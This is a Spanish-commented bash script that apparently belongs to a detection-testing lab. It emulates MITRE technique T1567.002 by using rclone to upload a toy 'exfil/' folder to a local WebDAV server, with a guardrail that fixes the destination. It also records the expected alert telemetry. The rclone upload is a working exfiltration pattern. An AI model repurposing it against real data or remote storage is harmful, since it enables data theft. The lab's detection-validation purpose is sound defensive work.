#!/usr/bin/env bash
# ============================================================================
# ATA049 · T1567.002 Exfiltration to Cloud Storage — ART ADAPTADO
# ----------------------------------------------------------------------------
# Tecnica : T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud
#           Storage (tactica Exfiltration).
# Fuente  : ART ADAPTADO. Atomica Linux de T1567.002
#           guid a4b74723-5cee-4300-91c3-5e34166909b4 (rclone + terraform -> AWS S3
#           real con claves). Se CONSERVA rclone (cliente de nube real) y se
#           SUSTITUYE el destino por un servicio WebDAV LOCAL del laboratorio;
#           se retira terraform y toda clave real.
# Objetivo: subir un directorio de datos de juguete (`exfil/`) a la "nube" local
#           (WebDAV del HOST en VMnet1). Demuestra la exfiltracion (sha256 identico
#           en el log del servicio).
# Destino : http://192.168.65.1:9090/ (WebDAV local del HOST). NUNCA el manager
#           (192.168.65.128) ni una nube/AWS/Mega reales.
# Ejecuta : desde /home/angel/lab-attack/ATA049 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada.
#
# GUARDARRAIL DURO (aborta): destino FIJO 192.168.65.1:9090; solo el servicio
#   local; sin claves reales; material pre-steado antes de t0.
#
# Telemetria esperada (README §5):
#   - execve de rclone             -> 80792 (deteccion; T1567.002-S1).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA049/*` (S2).
#
# Prueba de exito (INDEPENDIENTE de la alerta): el `sink.log` del WebDAV registra
#   las subidas PUT con `sha256` identico al de `exfil/*`.
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA049"
HOST="192.168.65.1"
PORT="9090"

echo "ATA049 · T1567.002 Exfiltration to Cloud Storage (WebDAV local) — ART adaptado"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -x "$BASE/rclone" ]; then
  echo "ERROR: falta $BASE/rclone (¿pre-staging?)" >&2
  exit 1
fi
if [ ! -d "$BASE/exfil" ]; then
  echo "ERROR: falta $BASE/exfil (¿pre-staging?)" >&2
  exit 1
fi

# --- GUARDARRAIL DE DESTINO ---
if [ "$HOST" != "192.168.65.1" ] || [ "$PORT" != "9090" ]; then
  echo "ERROR: destino '$HOST:$PORT' fuera del servicio local; ABORTADO" >&2
  exit 1
fi

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

CONF="$BASE/rclone.conf"
# Config del remote WebDAV LOCAL (sin usuario/contrasena/claves reales).
cat > "$CONF" <<EOF
[cloud]
type = webdav
url = http://${HOST}:${PORT}/
vendor = other
EOF

echo "--- rclone copy exfil/ -> cloud:bucket/ ---"
./rclone --config "$CONF" copy "$BASE/exfil" "cloud:bucket/" -v 2>&1
rc=$?
echo "rclone_rc=$rc"

echo "--- sha256 local de lo exfiltrado (prueba de efecto) ---"
sha256sum "$BASE"/exfil/* 2>/dev/null
echo "--- procesos rclone residuales ---"
pgrep -x rclone | wc -l

if [ "$rc" -eq 0 ]; then
  echo "EXFIL_CLOUD=OK (rclone subio exfil/ al WebDAV local)"
else
  echo "EXFIL_CLOUD=FALLO (rclone rc=$rc)" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
